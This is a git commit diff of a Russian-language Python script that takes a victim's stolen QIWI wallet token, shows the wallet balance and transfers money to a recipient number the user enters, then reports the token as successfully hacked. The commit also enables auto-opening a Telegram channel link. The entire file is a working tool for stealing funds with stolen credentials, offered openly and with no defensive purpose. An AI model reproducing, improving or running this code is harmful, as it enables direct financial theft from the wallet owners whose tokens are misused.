f75f153508be4f52da39e29695326faf293d5357
Azimjonm2333 <94979230+Azimjonm2333@users.noreply.github.com>
2022-02-09 10:59:29 +0300

    Update Qiwi.py

--- Qiwi.py
+++ Qiwi.py
@@ -7,23 +7,22 @@ import sys
 import webbrowser as wb
 
 print("СКРИПТ КАНАЛА: @b1n_bash")
-print("Версия: 0.1")
+print("Версия: 0.2")
 print("Сделана: @Azimjonm2333")
 
-#wb.open("https://t.me/b1n_bash")
+wb.open("https://t.me/b1n_bash")
 def main ():
         while True:
                 Token = input('\nВведите токен жертвы: ')
-                nomer = ''
 
                 try:
-                        wallet = pyqiwi.Wallet(token=Token, number= nomer)
-                        print('Баланс: ', wallet.balance(), 'рублей') # выводит баланс кошелька
-                        number = input('Пишите номер куда перевести деньги: ') # номер куда перевести бабло
-                        amount = int (input('Сумма в рублях которые хотите вывести ')) # сумма в рублях
-                        comment = input('Комент к платежу ') # комент к платежу
-                        wallet.send(pid=99, recipient = number, amount = amount, comment=comment) # это сделает перевод
-                        print ('\nВы успешно взломали киви токен:', Token)
+                        wallet = pyqiwi.Wallet(token=Token)
+                        print('Баланс: ', wallet.balance(), 'рублей')
+                        number = input('Пишите номер куда перевести деньги: ') 
+                        amount = int (input('Сумма в рублях которые хотите вывести: '))
+                        comment = input('Комент к платежу: ')
+                        wallet.send(pid=99, recipient = number, amount = amount, comment=comment)
+                        print ('\nВы успешно взломали киви токен: ', Token)
                         
                 except Exception:
                         print ('\nНеправильный токен или что-то пошло не так. Попробуйте ещё раз!')
